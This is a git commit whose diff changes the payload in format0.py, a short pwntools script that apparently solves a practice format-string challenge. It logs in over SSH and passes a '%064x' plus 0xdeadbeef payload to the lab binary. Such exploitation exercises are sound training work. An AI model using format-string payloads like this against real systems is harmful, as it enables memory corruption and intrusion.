de6cdbe73b1a311163212e154785df9fb6a3d878
Clément Bœsch <u@pkh.me>
2020-01-04 11:17:06 +0100

    format0: reduce payload size

--- format0.py
+++ format0.py
@@ -2,7 +2,7 @@ from pwn import *
 
 s = ssh(host=args.HOST, user=args.USER, password=args.PASS, port=int(args.PORT))
 
-payload = fit({64: 0xdeadbeef})
+payload = flat(['%064x', 0xdeadbeef])
 p = s.system([args.BIN, payload])
 
 ret = p.recvline()
